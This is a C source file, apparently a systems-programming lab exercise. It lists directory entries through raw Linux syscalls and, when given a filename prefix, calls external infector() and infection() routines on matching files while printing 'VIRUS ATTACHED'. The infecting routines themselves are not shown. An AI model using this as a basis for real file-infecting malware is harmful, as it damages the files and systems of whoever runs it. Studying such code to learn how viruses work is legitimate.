#include "util.h"

#define SYS_EXIT 1
#define SYS_GETDENTS 141
#define SYS_WRITE 4
#define STDOUT 1
#define SYS_OPEN 5
#define O_RDWR 2
#define SYS_SEEK 19
#define SEEK_SET 0
#define SHIRA_OFFSET 0x291
#define O_RDONLY 00
#define O_DIRECTORY 00200000
#define BUF_SIZE 8192

extern int system_call();
extern void infector(char* ch);
extern void infection();

struct linux_dirent  /* from sys_getdents man page*/
{
  unsigned long d_ino;
  int d_off;
  unsigned short d_reclen;
  char d_name[];
};


int main (int argc , char* argv[], char* envp[])
{
  
  int file_directory;
  long nread;
  char buf[BUF_SIZE];
  struct linux_dirent *d;
  long bpos;
  char* prefix = 0;    //  the prefix of the files to attach the code to
  int i;

  for (i = 0; i < argc; i++)
  {
    if(strncmp(argv[i], "-a", 2) == 0){
      prefix = argv[i] + 2;
    }
  }

  file_directory = system_call(SYS_OPEN, ".", O_RDONLY | O_DIRECTORY);   // the current directory
  if(file_directory == -1){
    system_call(SYS_EXIT, 0x55);
  }

  nread = system_call(SYS_GETDENTS, file_directory, buf, BUF_SIZE);   //  system call to get the directory's files/entries listing
  if (nread == -1)
  {
    system_call(SYS_EXIT, 0x55);
  }

  for (bpos = 0; bpos < nread;)
  {
    d = (struct linux_dirent *)(buf + bpos);    // setting the struct linux_dirent for the start of the loop as the next structure in the char buf
    if (prefix == 0)
    {
      system_call(SYS_WRITE, STDOUT, d->d_name, strlen(d->d_name));
      system_call(SYS_WRITE, STDOUT, "\n", 1);
    }else
    {
      system_call(SYS_WRITE, STDOUT, d->d_name, strlen(d->d_name));
      system_call(SYS_WRITE, STDOUT, " ", 1);
      if (strncmp(d->d_name, prefix, strlen(prefix)) == 0)
      {
        system_call(SYS_WRITE, STDOUT, "VIRUS ATTACHED\n", strlen("VIRUS ATTACHED\n"));
        infector(d->d_name);
        infection();
      }
      else{
        system_call(SYS_WRITE, STDOUT, "\n", 1);  
      }
    }
    bpos += d-> d_reclen;   
  }
  return 0;
}

